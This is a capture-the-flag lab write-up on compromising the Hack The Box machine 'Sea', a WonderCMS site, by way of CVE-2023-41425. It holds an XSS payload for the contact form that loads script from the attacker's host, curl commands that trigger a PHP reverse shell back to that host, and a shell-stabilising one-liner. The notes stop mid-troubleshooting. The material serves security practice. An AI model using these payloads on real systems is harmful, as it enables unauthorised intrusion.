Target:
10.10.11.28

**P-80**

Contact page with post form: http://sea.htb/contact.php

Looking at the source code of the main page i can see that it points to a picture of a bike.png, so i decide to fuzz that address: http://sea.com/themes/bike

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/common.txt -u http://sea.htb/themes/bike -x txt,md
```

`/README.md            (Status: 200) [Size: 318]`

```php
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

This reveals the CMS, so i'll look online for exploits.

**Exploit web-server:**

https://github.com/prodigiousMind/CVE-2023-41425

- Start a netcat session 
- Execute script and copy the payload into the contact form under website.

`http://sea.htb"></form><script+src="http://10.10.14.23:8000/xss.js"></script><form+action="`

- Now, after reading the exploit script we will find it create a shell file in this pass `{/themes/revshell-main/rev.php?lhost=” + ip + “&lport=” + port}`

- Wait for the http server to serve the exploit.
- Use curl to access the exploit.

```php
curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.23&lport=9999'
```

_The original script will create a malicious URL like [http://sea.htb/wondercms/index.php?page=loginURL](http://sea.htb/wondercms/index.php?page=loginURL), which will not be correct. It should be [http://sea.htb/index.php?page=loginURL](http://sea.htb/index.php?page=loginURL) that we should change this in the exploit script, or simply provide [http://sea.htb/loginURL](http://sea.htb/loginURL) as the first parameter for the EXP._

Stabilise shell:

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Find user amay that has user.txt, but it's owned by root.

I'm having trouble so i may try a different exploit, or mix it up with tools. 
- Could have missed /bike in the `curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.23&lport=9999'`

```php
curl 'http://sea.htb/themes/bike/revshell-main/rev.php?lhost=10.10.14.23&lport=9999'
```

Which would also mean the exploit command would be:

```xml
python3 exploit.py http://sea.htb/themes/bike <HOST_IP> <HOST_PORT>
```

